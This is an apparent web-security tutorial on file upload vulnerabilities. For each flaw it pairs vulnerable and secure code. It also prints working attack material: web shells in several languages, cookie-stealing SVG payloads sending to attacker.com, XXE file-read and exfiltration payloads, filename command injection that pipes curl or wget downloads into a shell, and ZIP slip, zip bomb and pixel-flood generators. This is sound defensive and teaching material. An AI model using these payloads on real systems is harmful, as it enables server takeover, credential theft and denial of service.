---
title: "File Upload Vulnerability: The Complete Guide"
description: "File Upload vulnerabilities are among the most critical and dangerous flaws in web applications. This guide provides complete coverage of all file upload attack types, from basic unrestricted uploads to advanced ZIP slip and XXE techniques. Whether you're a bug bounty hunter looking for your next critical finding or a developer securing your application, this guide has everything you need."
categoryLabel: Web Security
published: 2026-03-27
updated: 2026-03-27
tags: [file-upload, web-security, bug-bounty, owasp, web-shell]
authors:
  - name: Bhagirath Saxena
    initials: BS
    social: "@rix4uni"
---


## What is a File Upload Vulnerability?

A file upload vulnerability occurs when a web application allows users to upload files without sufficiently validating the name, type, content, or size of those files. Failures in this validation can allow attackers to upload malicious files — including server-side scripts — that can be executed to gain full control of the server, steal data, or compromise other users.

### Why File Upload Vulnerabilities Are Dangerous

- **Remote Code Execution (RCE)**: Upload a web shell and execute arbitrary OS commands
- **Server Takeover**: Gain persistent backdoor access to the underlying server
- **Stored XSS**: Serve malicious SVG or HTML files to other users
- **XXE Injection**: Parse malicious XML inside uploaded documents
- **Path Traversal**: Write files to arbitrary locations on the filesystem
- **Denial of Service**: Upload ZIP bombs or decompression bombs to crash the server
- **Credential Theft**: Overwrite config files or `.htaccess` to alter application behavior

---

## Unrestricted File Upload (Web Shell)

### What is an Unrestricted File Upload?

Unrestricted file upload occurs when an application places no meaningful restrictions on the type of file a user may upload. An attacker can upload a server-side script (PHP, ASP, JSP, etc.) directly, and if the server executes it, they achieve Remote Code Execution.

### How It Works

1. Attacker uploads a file containing server-side code (e.g., a PHP web shell)
2. The server stores the file in a web-accessible directory
3. Attacker navigates to the uploaded file's URL in a browser
4. The web server executes the script instead of serving it as static content
5. Attacker can now run arbitrary OS commands on the server

### Vulnerable Code Example

```php:vulnerable

<?php
// Vulnerable file upload — no validation whatsoever
if ($_FILES['file']['error'] === UPLOAD_ERR_OK) {
    $uploadDir = 'uploads/';
    $fileName   = $_FILES['file']['name'];  // Trusting user-supplied filename

    // Directly moving the file with no type or extension check
    move_uploaded_file($_FILES['file']['tmp_name'], $uploadDir . $fileName);

    echo "File uploaded: " . $uploadDir . $fileName;
}
?>
```

**Upload and exploit:**
```http

POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------Boundary--
```

**Then access the shell:**
```
https://example.com/uploads/shell.php?cmd=whoami
https://example.com/uploads/shell.php?cmd=cat+/etc/passwd
https://example.com/uploads/shell.php?cmd=id
```

### Web Shell Payloads by Language

| Language | Extension | Payload |
|----------|-----------|---------|
| PHP | `.php` | `<?php system($_GET['cmd']); ?>` |
| PHP (short) | `.php` | `<?=`whoami`?>` |
| ASP | `.asp` | `<% eval request("cmd") %>` |
| ASPX | `.aspx` | `<%= System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]) %>` |
| JSP | `.jsp` | `<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>` |
| CFML | `.cfm` | `<cfexecute name="cmd.exe" arguments="/c #url.cmd#">` |

### Secure Code Example

```php:secure

<?php
// Secure file upload with strict validation
$allowedTypes     = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
$maxFileSize      = 5 * 1024 * 1024; // 5 MB

if ($_FILES['file']['error'] !== UPLOAD_ERR_OK) {
    die("Upload error.");
}

// Check file size
if ($_FILES['file']['size'] > $maxFileSize) {
    die("File too large.");
}

// Validate MIME type using finfo (not Content-Type header)
$finfo    = new finfo(FILEINFO_MIME_TYPE);
$mimeType = $finfo->file($_FILES['file']['tmp_name']);
if (!in_array($mimeType, $allowedTypes)) {
    die("Invalid file type.");
}

// Validate extension from original name
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowedExtensions)) {
    die("Invalid file extension.");
}

// Generate a random filename — never trust user-supplied names
$safeFileName = bin2hex(random_bytes(16)) . '.' . $ext;
$uploadDir    = '/var/uploads/'; // Outside web root

move_uploaded_file($_FILES['file']['tmp_name'], $uploadDir . $safeFileName);
echo "Uploaded successfully.";
?>
```

---

## Extension Filter Bypass

### What is Extension Filter Bypass?

Many applications attempt to block dangerous file types by checking the file extension. These checks are frequently incomplete — developers block `.php` but forget dozens of alternative extensions that PHP (or other servers) will still execute.

### How It Works

1. Application checks if uploaded filename ends in `.php`
2. If so, upload is rejected
3. Attacker uses an alternate extension that the server still executes as PHP
4. Upload succeeds, shell is accessible and executable

### Alternative Executable Extensions

```bash

# PHP alternatives (executed by Apache/Nginx depending on config)
shell.php
shell.php3
shell.php4
shell.php5
shell.php7
shell.phtml
shell.phar
shell.shtml
shell.cgi

# ASP alternatives
shell.asp
shell.aspx
shell.asa
shell.cer
shell.cdx
shell.ashx
shell.asmx
shell.soap

# JSP alternatives
shell.jsp
shell.jspx
shell.jsw
shell.jsv
shell.jspf
```

### Double Extension Bypass

```bash

# If server strips or checks last extension only
shell.php.jpg       # Executed as PHP if misconfigured Apache strips .jpg
shell.jpg.php       # Last extension = .php → executed
shell.php.png
shell.php.gif

# Triple extension
shell.php.php.jpg
```

### Case Variation Bypass

```bash

# Some systems do case-sensitive extension checking
shell.PHP
shell.Php
shell.pHp
shell.PHp
shell.PhP
```

### Null Byte Bypass (older PHP / systems)

```bash

# In older PHP versions, null byte terminates string parsing
shell.php%00.jpg
shell.php\x00.jpg

# URL-encoded in Burp
filename="shell.php%00.jpg"
```

### Trailing Character Bypass

```bash

# Windows ignores trailing dots/spaces; Linux may handle differently
shell.php.
shell.php 
shell.php....
```

### Vulnerable Code Example

```php:vulnerable

<?php
// Vulnerable — only checks last extension, easily bypassed
$fileName = $_FILES['file']['name'];
$ext      = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

$blocked = ['php', 'asp', 'aspx', 'jsp'];

if (in_array($ext, $blocked)) {
    die("File type not allowed.");
}

// Attacker uploads shell.phtml or shell.php5 — passes this check
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $fileName);
?>
```

### Secure Code Example

```php:secure

<?php
// Secure — allowlist approach, only permit known-safe types
$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'pdf'];

$fileName = $_FILES['file']['name'];

// Strip any path components
$fileName = basename($fileName);

// Get extension — handle double extensions by checking full name
if (substr_count($fileName, '.') > 1) {
    die("Multiple extensions are not allowed.");
}

$ext = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

// Allowlist — NOT a blocklist
if (!in_array($ext, $allowedExtensions)) {
    die("Only image and PDF uploads are permitted.");
}

// Additionally verify with finfo
$finfo    = new finfo(FILEINFO_MIME_TYPE);
$mimeType = $finfo->file($_FILES['file']['tmp_name']);
$allowedMimes = ['image/jpeg','image/png','image/gif','image/webp','application/pdf'];
if (!in_array($mimeType, $allowedMimes)) {
    die("File content does not match allowed types.");
}
?>
```

---

## Content-Type / MIME Bypass

### What is Content-Type Bypass?

When an application validates the `Content-Type` header of the uploaded file, it is trusting data supplied entirely by the client. An attacker can intercept the upload request and change the `Content-Type` to any value they choose, tricking the server into accepting a malicious file as if it were a harmless image.

### How It Works

1. Attacker prepares a PHP web shell saved as `shell.php`
2. Uploads via browser — browser sets `Content-Type: application/x-php`
3. Server rejects: "Only images allowed"
4. Attacker intercepts request in Burp Suite
5. Changes `Content-Type` to `image/jpeg`
6. Forwards request — server accepts the "image"
7. File is stored as `shell.php` and executed on access

### Exploitation in Burp Suite

```http

POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg        ← Changed from application/x-php to image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

### Common MIME Type Spoofing Values

| Spoofed Content-Type | Appears to be |
|----------------------|--------------|
| `image/jpeg` | JPEG image |
| `image/png` | PNG image |
| `image/gif` | GIF image |
| `image/webp` | WebP image |
| `application/pdf` | PDF document |
| `text/plain` | Plain text file |

### Vulnerable Code Example

```python:vulnerable

# Flask — only checks Content-Type header (user-controlled)
@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']

    # VULNERABLE: Content-Type is sent by the client — trivially spoofable
    if file.content_type not in ['image/jpeg', 'image/png', 'image/gif']:
        return "Only images allowed", 400

    file.save(os.path.join('uploads', file.filename))
    return "Uploaded", 200
```

### Secure Code Example

```python:secure

import magic  # python-magic library reads actual file bytes

ALLOWED_MIMES = {'image/jpeg', 'image/png', 'image/gif', 'image/webp'}

@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']
    file_bytes = file.read(2048)  # Read first 2KB for magic bytes check
    file.seek(0)

    # Use libmagic to detect MIME from file content — NOT from header
    detected_mime = magic.from_buffer(file_bytes, mime=True)

    if detected_mime not in ALLOWED_MIMES:
        return "Invalid file type", 400

    # Generate a safe random filename
    ext = detected_mime.split('/')[1]
    safe_name = secrets.token_hex(16) + '.' + ext
    file.save(os.path.join('/var/uploads', safe_name))
    return jsonify({"url": f"/media/{safe_name}"}), 200
```

---

## Magic Bytes Bypass

### What is Magic Bytes Bypass?

Magic bytes (also called file signatures) are the first few bytes of a file that identify its type. Some applications use these bytes — rather than the extension or Content-Type header — to determine file type. Attackers can prepend valid image magic bytes to a malicious payload, tricking the server's magic byte check while the file still executes as a script.

### Common Magic Bytes

| File Type | Magic Bytes (Hex) | ASCII |
|-----------|-------------------|-------|
| JPEG | `FF D8 FF E0` | `ÿØÿà` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `‰PNG....` |
| GIF | `47 49 46 38 39 61` | `GIF89a` |
| PDF | `25 50 44 46` | `%PDF` |
| ZIP | `50 4B 03 04` | `PK..` |

### Exploitation

```python

# Prepend JPEG magic bytes to PHP shell
jpeg_magic = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00'
php_payload = b'\n<?php system($_GET["cmd"]); ?>'

with open('shell.php', 'wb') as f:
    f.write(jpeg_magic + php_payload)

# The file starts with valid JPEG bytes → passes magic check
# But extension is .php → server executes it as PHP
```

```bash

# Using exiftool to embed PHP in real image EXIF metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legitimate.jpg
cp legitimate.jpg shell.php

# Or inject into image description field
exiftool -Artist='<?php echo shell_exec($_GET["cmd"]); ?>' image.jpg
```

### GIF89a Payload (Classic)

```php

# GIF magic bytes followed by PHP — passes GIF check, executes as PHP
GIF89a
<?php system($_GET['cmd']); ?>
```
Save as `shell.php` — server sees `GIF89a` and thinks it's a GIF, but executes it as PHP.

### Vulnerable Code Example

```python:vulnerable

def check_magic_bytes(file_path):
    with open(file_path, 'rb') as f:
        header = f.read(4)
    
    magic_signatures = {
        b'\xff\xd8\xff': 'image/jpeg',
        b'\x89PNG': 'image/png',
        b'GIF8': 'image/gif',
    }
    
    for sig, mime in magic_signatures.items():
        if header.startswith(sig):
            return True  # VULNERABLE: Only checks first bytes, not full file content
    
    return False
```

### Secure Code Example

```python:secure

import magic
from PIL import Image
import io

def validate_image(file_bytes: bytes) -> bool:
    """
    Validate image by checking magic bytes AND attempting to fully decode it.
    A real image can be decoded by PIL; a PHP file with magic bytes prepended cannot.
    """
    # Step 1: Check MIME via magic bytes
    detected = magic.from_buffer(file_bytes[:2048], mime=True)
    if detected not in ('image/jpeg', 'image/png', 'image/gif', 'image/webp'):
        return False

    # Step 2: Attempt full image decode — will fail if content is not a real image
    try:
        img = Image.open(io.BytesIO(file_bytes))
        img.verify()  # Verifies the image is not corrupted or faked
        return True
    except Exception:
        return False
```

---

## .htaccess / Web Config Upload

### What is .htaccess Upload?

Apache web servers respect `.htaccess` files in directories — they can override server configuration for that directory. If an attacker can upload a malicious `.htaccess` file, they can instruct Apache to treat any file extension as executable PHP, effectively turning any uploaded file into a web shell.

### How It Works

1. Attacker uploads a crafted `.htaccess` file to the uploads directory
2. Apache reads the `.htaccess` and applies the new configuration
3. Attacker uploads an image file containing PHP code (e.g., `shell.jpg`)
4. Apache now executes `shell.jpg` as PHP because of the `.htaccess` directive
5. Attacker accesses the shell via browser

### Malicious .htaccess Payloads

```apache

# Make Apache treat .jpg files as PHP
AddType application/x-httpd-php .jpg

# Or treat ALL files as PHP
AddType application/x-httpd-php .png .gif .jpg .jpeg

# Alternative directive
SetHandler application/x-httpd-php

# Force PHP engine on specific file
<Files "shell.jpg">
    SetHandler application/x-httpd-php
</Files>
```

**Then upload the "image":**
```php

# shell.jpg — appears to be an image, executed as PHP
<?php system($_GET['cmd']); ?>
```

**Access:**
```
https://example.com/uploads/shell.jpg?cmd=id
```

### IIS web.config Equivalent

On IIS (Windows) servers, `web.config` serves the same purpose:

```xml

<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*"
              modules="IsapiModule"
              scriptProcessor="%windir%\system32\inetsrv\asp.dll"
              resourceType="Unspecified" requireAccess="Write"
              preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
```

### Secure Code Example

```python:secure

BLOCKED_FILENAMES = {
    '.htaccess', '.htpasswd', 'web.config', '.user.ini',
    'php.ini', '.env', 'Makefile', '.bashrc'
}

def is_safe_filename(filename: str) -> bool:
    """Reject dangerous configuration filenames"""
    name = filename.strip().lower()
    basename = os.path.basename(name)

    if basename in BLOCKED_FILENAMES:
        return False

    # Also block hidden files (starting with dot)
    if basename.startswith('.'):
        return False

    return True
```

---

## SVG — Stored XSS via File Upload

### What is SVG XSS?

SVG (Scalable Vector Graphics) is an XML-based image format that supports embedded JavaScript. When an application allows SVG uploads and serves them with `Content-Type: image/svg+xml`, any JavaScript inside the SVG executes in the victim's browser — achieving Stored XSS via file upload.

### How It Works

1. Attacker crafts a malicious SVG file containing JavaScript
2. Uploads it to the application (profile picture, image gallery, etc.)
3. Another user views the page that displays the SVG
4. Browser renders the SVG and executes the embedded JavaScript
5. Attacker steals cookies, session tokens, or performs CSRF

### SVG XSS Payloads

```xml

<!-- Basic alert PoC -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>
```

```xml

<!-- Cookie stealing payload -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie));
  </script>
</svg>
```

```xml

<!-- Onload event alternative (if script tag is filtered) -->
<svg xmlns="http://www.w3.org/2000/svg"
     onload="fetch('https://attacker.com/?c='+document.cookie)">
</svg>
```

```xml

<!-- Embedded in foreignObject -->
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="1" height="1">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert(1)</script>
    </body>
  </foreignObject>
</svg>
```

### Common Injection Points

| Target | Location | Impact |
|--------|----------|--------|
| Profile avatar | Displayed to all visitors | Mass cookie theft |
| Image gallery | Viewed by other users | Session hijacking |
| Forum attachments | Read by forum members | CSRF attacks |
| PDF / Document upload | Rendered in browser | Admin panel XSS |

### Secure Code Example

```python:secure

import defusedxml.ElementTree as ET

def validate_svg(file_bytes: bytes) -> bool:
    """Parse SVG and strip dangerous elements"""
    FORBIDDEN_TAGS = {
        'script', 'handler', 'foreignObject', 'set', 'animate',
        'use', 'image', 'a', 'view'
    }
    FORBIDDEN_ATTRS = {
        'onload', 'onclick', 'onerror', 'onmouseover', 'onfocus',
        'onblur', 'onchange', 'href', 'xlink:href'
    }

    try:
        tree = ET.fromstring(file_bytes)
    except ET.ParseError:
        return False

    for element in tree.iter():
        tag = element.tag.split('}')[-1].lower()  # Strip namespace
        if tag in FORBIDDEN_TAGS:
            return False
        for attr in element.attrib:
            attr_name = attr.split('}')[-1].lower()
            if attr_name in FORBIDDEN_ATTRS:
                return False

    return True

# Additionally: serve SVGs with Content-Disposition: attachment
# to prevent browser from rendering/executing them inline
response.headers['Content-Disposition'] = 'attachment; filename="image.svg"'
response.headers['Content-Type'] = 'text/plain'  # Never serve as image/svg+xml
```

---

## XXE via File Upload

### What is XXE via File Upload?

XML External Entity (XXE) injection via file upload occurs when an application parses XML-based files — such as SVG, DOCX, XLSX, ODT, or raw XML — without disabling external entity processing. An attacker can craft a malicious file with an external entity that reads local files from the server or triggers SSRF.

### How It Works

1. Attacker crafts a malicious XML/SVG/DOCX file with an XXE payload
2. Uploads the file to the application
3. Server-side parser processes the file and resolves the external entity
4. Entity resolves to a local file (e.g., `/etc/passwd`) or an internal URL
5. Content is returned in the response or exfiltrated out-of-band

### XXE via SVG Upload

```xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text y="20">&xxe;</text>
</svg>
```

### XXE via DOCX Upload

DOCX files are ZIP archives containing XML. Inject XXE into `word/document.xml`:

```bash

# Unzip a valid .docx
unzip original.docx -d docx_extracted

# Edit word/document.xml — add XXE entity
cat > docx_extracted/word/document.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<w:document xmlns:wpc="..." xmlns:w="...">
  <w:body>
    <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
  </w:body>
</w:document>
EOF

# Repack as .docx
cd docx_extracted && zip -r ../malicious.docx .
```

### XXE Payloads by Target

```xml

<!-- Read local file -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- SSRF — internal network probe -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

<!-- Read source code -->
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">

<!-- Windows path -->
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">

<!-- Out-of-band exfiltration (when result not reflected) -->
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!ENTITY % wrapper "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%payload;'>">
```

### Secure Code Example

```python:secure

import defusedxml.ElementTree as ET
from lxml import etree

def parse_xml_safely(xml_bytes: bytes):
    """
    Use defusedxml to safely parse XML — disables external entities,
    DTD processing, and billion laughs attacks by default.
    """
    try:
        # defusedxml raises exceptions on XXE/DTD attacks
        tree = ET.fromstring(xml_bytes)
        return tree
    except ET.ParseError as e:
        raise ValueError(f"Invalid XML: {e}")

def parse_with_lxml_safely(xml_bytes: bytes):
    """Alternative: use lxml with explicit security settings"""
    parser = etree.XMLParser(
        resolve_entities=False,   # Disable entity resolution
        no_network=True,          # No external network access
        dtd_validation=False,     # No DTD validation
        load_dtd=False            # Don't load external DTDs
    )
    return etree.fromstring(xml_bytes, parser=parser)
```

---

## ZIP Slip (Archive Path Traversal)

### What is ZIP Slip?

ZIP Slip is a critical vulnerability that occurs when an application extracts a ZIP archive without sanitizing the file paths contained within it. An attacker crafts a ZIP file where one or more entries have filenames containing path traversal sequences (`../`). When extracted, these files land outside the intended directory — potentially overwriting server files or planting a web shell anywhere on the filesystem.

### How It Works

1. Attacker crafts a ZIP file containing a file named `../../var/www/html/shell.php`
2. Uploads the ZIP to the application
3. Server extracts the ZIP without checking paths
4. `shell.php` is written to `/var/www/html/` (web root) instead of the uploads folder
5. Attacker accesses `https://example.com/shell.php` and has RCE

### Creating a Malicious ZIP

```python

import zipfile
import os

def create_zip_slip(output_path, target_path, payload):
    """
    Create a ZIP file that extracts payload to an arbitrary path.
    target_path: e.g., '../../var/www/html/shell.php'
    payload: file content (e.g., PHP web shell)
    """
    with zipfile.ZipFile(output_path, 'w') as zf:
        # Add the malicious entry with path traversal in filename
        zf.writestr(target_path, payload)
        # Also add a legitimate file to appear normal
        zf.writestr('image.jpg', b'\xff\xd8\xff' + b'A' * 1000)

    print(f"[+] Created {output_path}")
    print(f"[+] Payload will extract to: {target_path}")

create_zip_slip(
    output_path   = 'exploit.zip',
    target_path   = '../../var/www/html/shell.php',
    payload       = '<?php system($_GET["cmd"]); ?>'
)
```

### Common ZIP Slip Targets

```
../../var/www/html/shell.php           → Web root (Apache/Nginx)
../../app/public/shell.php             → Laravel public directory
../../../home/user/.ssh/authorized_keys → SSH key injection
../../etc/cron.d/backdoor              → Cron job for persistence
../../proc/self/fd                     → Special Linux filesystem
../templates/shell.tpl                 → Template injection
```

### Vulnerable Code Example

```python:vulnerable

import zipfile
import os

def extract_zip(zip_path, extract_to):
    with zipfile.ZipFile(zip_path, 'r') as zf:
        for member in zf.namelist():
            # VULNERABLE: No path sanitization
            zf.extract(member, extract_to)
            print(f"Extracted: {member}")
```

### Secure Code Example

```python:secure

import zipfile
import os

def safe_extract_zip(zip_path: str, extract_to: str):
    """Safely extract a ZIP file, preventing path traversal (ZIP Slip)"""
    extract_to = os.path.realpath(extract_to)

    with zipfile.ZipFile(zip_path, 'r') as zf:
        for member in zf.namelist():
            # Resolve the final path of this member
            member_path = os.path.realpath(os.path.join(extract_to, member))

            # Ensure the resolved path starts with the intended extract directory
            if not member_path.startswith(extract_to + os.sep):
                raise ValueError(
                    f"ZIP Slip detected: {member} would extract to {member_path}"
                )

            # Safe to extract
            zf.extract(member, extract_to)

    print(f"[+] ZIP extracted safely to {extract_to}")
```

---

## Path Traversal via Filename

### What is Path Traversal via Filename?

When an application uses the user-supplied filename to construct a file path on disk without sanitization, an attacker can inject `../` sequences to write the uploaded file to an arbitrary location on the filesystem.

### How It Works

1. Application takes `filename` from the multipart upload
2. Concatenates it with upload directory: `uploads/ + filename`
3. If filename is `../../shell.php`, the final path becomes `shell.php` in web root
4. File is written outside the intended uploads directory

### Filename Injection Payloads

```http

# Path traversal
filename="../../var/www/html/shell.php"
filename="../../../shell.php"
filename="....//....//....//shell.php"

# Windows path traversal
filename="..\\..\\.\\shell.php"
filename="..\\..\\inetpub\\wwwroot\\shell.php"

# URL-encoded
filename="%2e%2e%2fshell.php"
filename="%2e%2e%2f%2e%2e%2fshell.php"

# Double URL-encoded
filename="%252e%252e%252fshell.php"

# Null byte (older systems)
filename="shell.php%00.jpg"
```

### Command Injection via Filename

If the server uses the filename in a shell command (e.g., for image processing):

```bash

# If server runs: convert upload/FILENAME thumbnail/FILENAME
# Inject shell commands via filename
filename="shell.jpg; curl http://attacker.com/shell.sh | bash"
filename="shell.jpg && wget http://attacker.com/shell -O /tmp/s && chmod +x /tmp/s && /tmp/s"
filename="$(curl http://attacker.com/rce).jpg"
filename="`id`.jpg"
```

### Vulnerable Code Example

```python:vulnerable

import os

@app.route('/upload', methods=['POST'])
def upload():
    f        = request.files['file']
    filename = f.filename   # VULNERABLE: Directly using user-supplied filename

    # VULNERABLE: No sanitization — allows ../../../shell.php
    save_path = os.path.join('uploads', filename)
    f.save(save_path)
    return f"Saved to {save_path}"
```

### Secure Code Example

```python:secure

import os
import secrets
from werkzeug.utils import secure_filename

@app.route('/upload', methods=['POST'])
def upload():
    f = request.files['file']

    # Step 1: Use werkzeug's secure_filename to sanitize
    safe_name = secure_filename(f.filename)

    # Step 2: Generate random prefix to prevent enumeration
    random_prefix = secrets.token_hex(8)
    final_name = f"{random_prefix}_{safe_name}"

    # Step 3: Resolve absolute path and verify it stays within upload dir
    upload_dir  = os.path.realpath('/var/uploads')
    target_path = os.path.realpath(os.path.join(upload_dir, final_name))

    if not target_path.startswith(upload_dir + os.sep):
        return "Invalid filename", 400

    f.save(target_path)
    return jsonify({"file": final_name}), 200
```

---

## Denial of Service via Upload

### What is DoS via File Upload?

Attackers can abuse file upload endpoints to exhaust server resources — CPU, memory, or disk — by uploading specially crafted files that are cheap to create but expensive to process.

### ZIP Bomb (Decompression Bomb)

A tiny ZIP file that expands to petabytes when decompressed:

```python

import zipfile
import io

def create_zip_bomb(filename='bomb.zip', depth=5):
    """Create a nested ZIP bomb"""
    # Start with 1MB of zeros
    content = b'\x00' * (1024 * 1024)

    for i in range(depth):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
            for j in range(10):
                zf.writestr(f'file{j}.zip', content)
        content = buf.getvalue()

    with open(filename, 'wb') as f:
        f.write(content)
    print(f"[+] ZIP bomb created: {filename} ({len(content)} bytes compressed)")

create_zip_bomb()
```

### Pixel Flood Attack (Image DoS)

Some image processing libraries allocate memory based on declared dimensions:

```python

from PIL import Image

# Create a 1x1 PNG that claims to be 50000x50000
img = Image.new('RGB', (1, 1), color='red')

# Modify PNG metadata to claim huge dimensions
import struct, zlib

def create_pixel_flood(filename='flood.png'):
    """PNG with falsely claimed huge dimensions"""
    def make_chunk(chunk_type, data):
        c = chunk_type + data
        return struct.pack('>I', len(data)) + c + struct.pack('>I', zlib.crc32(c) & 0xffffffff)

    png = b'\x89PNG\r\n\x1a\n'
    # IHDR: claim 50000x50000 pixels (10GB when decoded)
    ihdr_data = struct.pack('>IIBBBBB', 50000, 50000, 8, 2, 0, 0, 0)
    png += make_chunk(b'IHDR', ihdr_data)
    png += make_chunk(b'IDAT', zlib.compress(b'\x00' * 10))
    png += make_chunk(b'IEND', b'')

    with open(filename, 'wb') as f:
        f.write(png)

create_pixel_flood()
```

### Secure Code Example

```python:secure

from PIL import Image
import io

MAX_FILE_SIZE   = 5 * 1024 * 1024    # 5 MB raw upload
MAX_IMAGE_PIXELS = 25_000_000         # 25 megapixels max (e.g., 5000x5000)
MAX_ZIP_UNCOMPRESSED = 50 * 1024 * 1024  # 50 MB uncompressed ZIP

def validate_upload_safety(file_bytes: bytes, filename: str):
    # 1. Enforce raw file size limit
    if len(file_bytes) > MAX_FILE_SIZE:
        raise ValueError("File exceeds maximum allowed size")

    # 2. For images: check declared dimensions before decoding
    if filename.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
        try:
            img = Image.open(io.BytesIO(file_bytes))
            w, h = img.size
            if w * h > MAX_IMAGE_PIXELS:
                raise ValueError(f"Image dimensions too large: {w}x{h}")
        except Exception as e:
            raise ValueError(f"Invalid image: {e}")

    # 3. For ZIPs: check uncompressed size before extracting
    if filename.lower().endswith('.zip'):
        import zipfile
        with zipfile.ZipFile(io.BytesIO(file_bytes)) as zf:
            total = sum(info.file_size for info in zf.infolist())
            if total > MAX_ZIP_UNCOMPRESSED:
                raise ValueError(f"ZIP uncompressed size too large: {total} bytes")
```

---

## Bug Bounty Hunter's Guide

### Where to Look for File Upload Vulnerabilities

#### 1. Obvious Upload Points

- Profile picture / avatar upload
- Document / attachment upload (support tickets, forms)
- Product image upload (e-commerce)
- Resume / CV upload (job portals)
- Media import features (video, audio)
- Bulk data import (CSV, XLSX, XML)

#### 2. Hidden Upload Points

```bash

# Find file upload endpoints via crawling
gau target.com | grep -iE "(upload|import|attach|file|media|avatar|photo|image)"

# Check mobile API endpoints — often less protected
/api/v1/upload
/api/mobile/avatar
/api/user/photo
/internal/import
```

#### 3. Google Dorks for Finding Targets

```

# Find upload forms
inurl:/upload intitle:"upload"
inurl:/file-upload site:*.io
inurl:/import intitle:"import"

# Find image/file upload pages
inurl:/avatar/upload
inurl:/profile/photo
inurl:/attachments/upload

# Bug bounty programs with upload in scope
site:hackerone.com "file upload" "in scope"
site:bugcrowd.com "unrestricted file upload"
site:intigriti.com "file upload"

# Find exposed upload directories
intitle:"index of" inurl:/uploads
intitle:"index of" inurl:/files
intitle:"index of" inurl:/media/uploads
```

### Testing Methodology

#### Step 1: Enumerate All Upload Endpoints

```bash

# Spider the application
katana -u https://target.com -d 5 | grep -iE "upload|file|attach|import|photo|avatar"

# Check JS files for hidden endpoints
gau target.com | grep "\.js$" | xargs -I{} curl -s {} | grep -iE "upload|/api/"
```

#### Step 2: Upload a Legitimate File First

```bash

# Understand what a valid request looks like before testing
# Note: filename, Content-Type, field name, response format, and upload path
```

#### Step 3: Fuzz the Extension

```bash

# Using ffuf with extension wordlist
cat extensions.txt | while read ext; do
    echo "[*] Trying: shell.$ext"
    curl -s -X POST https://target.com/upload \
        -F "file=@shell.php;filename=shell.$ext;type=image/jpeg" \
        | grep -i "url\|path\|success\|error"
done
```

#### Step 4: Test Content-Type and Magic Bytes

```python

import requests

url = "https://target.com/upload"
headers = {"Authorization": "Bearer YOUR_TOKEN"}
php_payload = b"<?php system($_GET['cmd']); ?>"

# Test 1: Correct MIME
files = {"file": ("shell.php", php_payload, "application/x-php")}
r = requests.post(url, files=files, headers=headers)
print(f"[PHP MIME] {r.status_code} — {r.text[:100]}")

# Test 2: Spoofed MIME
files = {"file": ("shell.php", php_payload, "image/jpeg")}
r = requests.post(url, files=files, headers=headers)
print(f"[JPEG MIME] {r.status_code} — {r.text[:100]}")

# Test 3: Magic bytes + PHP
magic = b'\xff\xd8\xff\xe0' + php_payload
files = {"file": ("shell.php", magic, "image/jpeg")}
r = requests.post(url, files=files, headers=headers)
print(f"[Magic+PHP] {r.status_code} — {r.text[:100]}")
```

#### Step 5: Find the Uploaded File

```bash

# Check response for URL
# Common paths if not returned:
PATHS=(
    "/uploads/"
    "/files/"
    "/media/"
    "/static/uploads/"
    "/content/uploads/"
    "/assets/uploads/"
    "/public/uploads/"
    "/storage/"
)

for path in "${PATHS[@]}"; do
    curl -s -o /dev/null -w "%{http_code}" \
        "https://target.com${path}shell.php" | grep -v 404 && \
        echo " → Found at: ${path}shell.php"
done
```

### Quick Testing Checklist

```bash

[ ] Upload .php directly
[ ] Try alternate extensions: .php3 .php5 .phtml .phar .shtml
[ ] Try double extension: shell.php.jpg, shell.jpg.php
[ ] Try case variation: shell.PHP, shell.Php
[ ] Change Content-Type to image/jpeg
